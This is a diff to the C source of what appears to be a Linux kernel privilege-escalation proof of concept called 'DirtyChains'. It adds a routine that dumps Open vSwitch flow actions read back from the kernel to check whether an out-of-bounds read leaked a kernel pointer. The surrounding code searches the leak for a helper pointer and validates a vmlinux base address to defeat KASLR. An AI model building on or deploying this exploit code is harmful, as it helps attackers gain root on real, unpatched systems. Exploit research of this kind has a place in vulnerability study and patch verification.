@@ -2765,6 +2765,29 @@ static int find_helper_pointer(const struct buf *actions, uint64_t *out)
     return -1;
 }
 
+/* 失败诊断：把 flow get 回来的 action 链原样打出来，
+ * 对照内核实际写入的 nlattr 长度，判断越界读有没有发生。 */
+static void dump_flow_actions(const struct buf *b)
+{
+    size_t off = 0;
+    struct attr a;
+    int n = 0, i;
+
+    pr_dim("  回读 actions: %zu 字节\n", b->len);
+    while (n < 10 && attr_next(b->p, b->len, &off, &a) == 0) {
+        pr_dim("    [%d] type=%u raw=%zu payload=%zu\n",
+               n, (unsigned)a.type, a.raw_len, a.len);
+        n++;
+    }
+    if (n == 0)
+        pr_dim("    (属性解析不出来)\n");
+
+    pr_dim("  前 96 字节:");
+    for (i = 0; i < 96 && (size_t)i < b->len; i++)
+        pr_dim("%s%02x", (i % 16) ? " " : "\n    ", b->p[i]);
+    pr_dim("\n");
+}
+
 static int valid_vmlinux_base(uint64_t v)
 {
     return v >= 0xFFFFFFFF80000000ULL && v <= 0xFFFFFFFFF0000000ULL &&
@@ -2995,8 +3018,9 @@ static int setup_primitives(struct prim *p, const char *dp_name, int verbose)
     }
 
     if (find_helper_pointer(&leaked, &p->helper_ptr) != 0) {
-        buf_free(&leaked);
         pr_err("泄漏的 OUTPUT 里没有内核指针——这条链在这个内核上可能已修\n");
+        dump_flow_actions(&leaked);
+        buf_free(&leaked);
         return -1;
     }
     buf_free(&leaked);
@@ -3797,7 +3821,7 @@ int ovswrap_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-10-31-r30"
+#define DF_BUILD        "2026-10-31-r31"
 #define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
